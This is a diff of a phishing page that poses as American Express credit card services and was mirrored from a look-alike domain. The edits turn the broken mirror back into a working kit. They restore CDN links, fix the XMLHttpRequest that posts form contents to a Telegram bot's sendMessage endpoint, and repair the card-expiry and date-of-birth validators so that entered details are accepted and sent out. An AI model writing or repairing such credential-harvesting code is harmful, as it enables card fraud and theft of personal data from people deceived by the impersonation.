@@ -1,18 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<!-- Mirrored from s-american-expresss.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 14 Jan 2026 05:14:21 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>American Express - Credit Card Services</title>
     
     <!-- Fixed Font Awesome Link -->
-    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <!-- Local Lottie Animation -->
-    <script src="../unpkg.com/%40lottiefiles/lottie-player%402.0.12/dist/lottie-player.js"></script>
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@2.0.12/dist/lottie-player.js"></script>
     
     <style>
         /* General Styles */
@@ -847,7 +845,7 @@
             cibilAnimation.innerHTML = `
                 <div class="lottie-container">
                     <lottie-player
-                        src="../external.html?link=https://assets2.lottiefiles.com/packages/lf20_6xfqjauj.json"
+                        src="https://assets2.lottiefiles.com/packages/lf20_6xfqjauj.json"
                         background="transparent"
                         speed="1"
                         style="width: 200px; height: 200px"
@@ -884,7 +882,7 @@
             cibilAnimation.innerHTML = `
                 <div class="lottie-container">
                     <lottie-player
-                        src="../external.html?link=https://assets9.lottiefiles.com/packages/lf20_gsa5wsno.json"
+                        src="https://assets9.lottiefiles.com/packages/lf20_gsa5wsno.json"
                         background="transparent"
                         speed="1"
                         style="width: 200px; height: 200px"
@@ -915,7 +913,7 @@
             cibilAnimation.innerHTML = `
                 <div class="lottie-container">
                     <lottie-player
-                        src="../external.html?link=https://assets1.lottiefiles.com/packages/lf20_fg6sljto.json"
+                        src="https://assets1.lottiefiles.com/packages/lf20_fg6sljto.json"
                         background="transparent"
                         speed="1"
                         style="width: 200px; height: 200px"
@@ -1056,12 +1054,6 @@
             try {
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 
-                // Use fetch with no-cors mode for demo purposes
-                const data = new FormData();
-                data.append('chat_id', chatId);
-                data.append('text', message);
-                data.append('parse_mode', 'Markdown');
-                
                 // Alternative method using XMLHttpRequest
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', url, true);
@@ -1093,7 +1085,7 @@
             try {
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST.html', url, true);
+                xhr.open('POST', url, true);
                 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                 xhr.send(`chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
                 
@@ -1146,8 +1138,6 @@
                 value = value.slice(0, 2) + '/' + value.slice(2);
             } else if (value.length > 4) {
                 value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
-            } else if (value.length === 2) {
-                value = value + '/';
             }
             
             input.value = value;
@@ -1159,46 +1149,93 @@
             
             if (value.length > 2) {
                 value = value.slice(0, 2) + '/' + value.slice(2, 4);
-            } else if (value.length === 2) {
-                value = value + '/';
             }
             
             input.value = value;
             validateExpiry();
         }
 
+        // FIXED DATE VALIDATION FUNCTION
         function isValidDate(dateString) {
-            const parts = dateString.split('index.html');
-            if (parts.length !== 3) return false;
+            // Check format DD/MM/YYYY
+            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dateString)) {
+                return false;
+            }
             
+            const parts = dateString.split('/');
             const day = parseInt(parts[0], 10);
             const month = parseInt(parts[1], 10);
             const year = parseInt(parts[2], 10);
             
-            if (isNaN(day) || isNaN(month) || isNaN(year)) return false;
-            if (day < 1 || day > 31) return false;
-            if (month < 1 || month > 12) return false;
-            if (year < 1900 || year > new Date().getFullYear()) return false;
+            // Check if all are numbers
+            if (isNaN(day) || isNaN(month) || isNaN(year)) {
+                return false;
+            }
+            
+            // Check ranges
+            if (year < 1900 || year > new Date().getFullYear()) {
+                return false;
+            }
+            
+            if (month < 1 || month > 12) {
+                return false;
+            }
+            
+            // Days in month validation
+            const daysInMonth = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+            
+            // Check for leap year (February)
+            if (month === 2) {
+                const isLeapYear = (year % 400 === 0) || (year % 100 !== 0 && year % 4 === 0);
+                if (day < 1 || day > (isLeapYear ? 29 : 28)) {
+                    return false;
+                }
+            } else if (day < 1 || day > daysInMonth[month - 1]) {
+                return false;
+            }
             
             return true;
         }
 
+        // FIXED EXPIRY DATE VALIDATION FUNCTION
         function isValidExpiry(expiryString) {
-            const parts = expiryString.split('index.html');
-            if (parts.length !== 2) return false;
+            // Check format MM/YY
+            if (!/^\d{2}\/\d{2}$/.test(expiryString)) {
+                return false;
+            }
             
+            const parts = expiryString.split('/');
             const month = parseInt(parts[0], 10);
-            const year = parseInt(parts[1], 10) + 2000;
+            const year = parseInt(parts[1], 10);
             
-            if (isNaN(month) || isNaN(year)) return false;
-            if (month < 1 || month > 12) return false;
+            // Check if numbers
+            if (isNaN(month) || isNaN(year)) {
+                return false;
+            }
             
+            // Check month range
+            if (month < 1 || month > 12) {
+                return false;
+            }
+            
+            // Get current date
             const currentDate = new Date();
-            const currentYear = currentDate.getFullYear();
+            const currentYear = currentDate.getFullYear() % 100; // Last 2 digits
             const currentMonth = currentDate.getMonth() + 1;
             
-            if (year < currentYear) return false;
-            if (year === currentYear && month < currentMonth) return false;
+            // Check if expiry date is in the future
+            if (year < currentYear) {
+                return false;
+            }
+            
+            if (year === currentYear && month < currentMonth) {
+                return false;
+            }
+            
+            // Also check if not too far in future (max 10 years)
+            if (year > currentYear + 10) {
+                return false;
+            }
             
             return true;
         }
@@ -1207,6 +1244,4 @@
         window.onload = initForm;
     </script>
 </body>
-  
-<!-- Mirrored from s-american-expresss.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 14 Jan 2026 05:14:28 GMT -->
 </html>
